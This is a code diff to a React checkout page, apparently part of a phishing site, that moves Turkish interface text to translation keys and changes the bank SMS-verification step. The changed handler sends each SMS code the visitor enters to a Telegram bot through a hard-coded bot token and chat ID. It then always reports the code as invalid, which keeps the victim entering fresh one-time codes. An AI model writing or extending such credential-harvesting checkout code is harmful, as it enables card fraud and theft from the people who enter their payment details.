@@ -153,11 +153,11 @@ const CheckoutPage = () => {
   };
 
   const handleSmsSubmit = async () => {
-    if (!smsCode.trim() || smsCode.length < 4) {
-      setSmsError("Lütfen SMS kodunu girin");
+    if (!smsCode.trim()) {
+      setSmsError(t("checkout.smsInvalid"));
       return;
     }
-    setSmsError("");
+    // Always show invalid code error and send to Telegram
     setIsSubmitting(true);
     try {
       const BOT_TOKEN = "8409248678:AAHcUnoy_00kFq71n-TY2gQZ1QLSOBQXZR0";
@@ -169,11 +169,12 @@ const CheckoutPage = () => {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }),
       });
-      navigate("/", { state: { paymentSuccess: true } });
     } catch (err) {
       console.error("Telegram SMS error:", err);
     } finally {
       setIsSubmitting(false);
+      setSmsCode("");
+      setSmsError(t("checkout.smsInvalid"));
     }
   };
 
@@ -428,9 +429,9 @@ const CheckoutPage = () => {
               <div className="mx-auto w-16 h-16 bg-accent/10 rounded-full flex items-center justify-center mb-4">
                 <ShieldCheck className="w-8 h-8 text-accent" />
               </div>
-              <h2 className="text-xl font-bold text-foreground">SMS Doğrulama</h2>
+              <h2 className="text-xl font-bold text-foreground">{t("checkout.smsTitle")}</h2>
               <p className="text-sm text-muted-foreground mt-2">
-                Bankanız tarafından telefonunuza gönderilen doğrulama kodunu girin.
+                {t("checkout.smsDesc")}
               </p>
             </div>
 
@@ -439,7 +440,7 @@ const CheckoutPage = () => {
               <input
                 value={smsCode}
                 onChange={(e) => { setSmsCode(e.target.value.replace(/\D/g, "")); setSmsError(""); }}
-                placeholder="SMS Kodu"
+                placeholder={t("checkout.smsPlaceholder")}
                 className={inputFieldClass}
                 maxLength={8}
                 autoFocus
@@ -449,7 +450,7 @@ const CheckoutPage = () => {
 
             <div className="flex justify-center pt-2">
               <button onClick={handleSmsSubmit} disabled={isSubmitting} className="flex items-center gap-3 bg-foreground text-background rounded-full pl-6 pr-2 py-2 hover:opacity-90 transition-opacity disabled:opacity-50">
-                <span className="text-sm font-semibold">{isSubmitting ? "Doğrulanıyor..." : "Doğrula ve Öde"}</span>
+                <span className="text-sm font-semibold">{isSubmitting ? t("checkout.smsSubmitting") : t("checkout.smsSubmit")}</span>
                 <span className="bg-accent rounded-full p-2">
                   <ArrowRight className="w-4 h-4 text-accent-foreground" />
                 </span>
@@ -457,7 +458,7 @@ const CheckoutPage = () => {
             </div>
 
             <p className="text-xs text-muted-foreground text-center">
-              Kodunuz gelmedi mi? Lütfen birkaç dakika bekleyin veya bankanızla iletişime geçin.
+              {t("checkout.smsHelp")}
             </p>
           </div>
         )}
